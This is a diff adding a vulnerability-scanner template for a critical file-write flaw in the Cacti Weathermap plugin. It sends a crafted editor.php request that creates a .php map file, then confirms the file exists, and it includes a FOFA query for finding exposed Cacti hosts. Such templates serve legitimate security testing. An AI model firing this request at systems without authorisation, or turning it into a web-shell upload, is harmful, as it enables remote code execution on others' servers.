@@ -1,0 +1,31 @@
+id: cacti-weathermap-file-write
+
+info:
+  name: Cacti Weathermap File Write
+  author: SleepingBag945
+  severity: critical
+  description: |
+    Remote attacker can use to replace web application files with malicious code and perform remote code execution on the system.
+  metadata:
+    fofa-query: app="cacti-监控系统" || title="Login to Cacti" || app="Cactiez"
+  tags: getshell
+
+http:
+  - raw:
+      - |
+        GET /plugins/weathermap/editor.php?plug=0&mapname={{randstr_1}}.php&action=set_map_properties&param=&param2=&debug=existing&node_name=&node_x=&node_y=&node_new_name=&node_label=&node_infourl=&node_hover=&node_iconfilename=--NONE--&link_name=&link_bandwidth_in=&link_bandwidth_out=&link_target=&link_width=&link_infourl=&link_hover=&map_title={{randstr_2}}&map_legend=Traffic+Load&map_stamp=Created%3A%2B%25b%2B%25d%2B%25Y%2B%25H%3A%25M%3A%25S&map_linkdefaultwidth=7  HTTP/1.1
+        Host: {{Hostname}}
+
+
+      - |
+        GET /plugins/weathermap/configs/{{randstr_1}}.php  HTTP/1.1
+        Host: {{Hostname}}
+
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_1 == 200'
+          - 'status_code_2 == 200 && contains(body_2,"{{randstr_2}}")'
+        condition: and
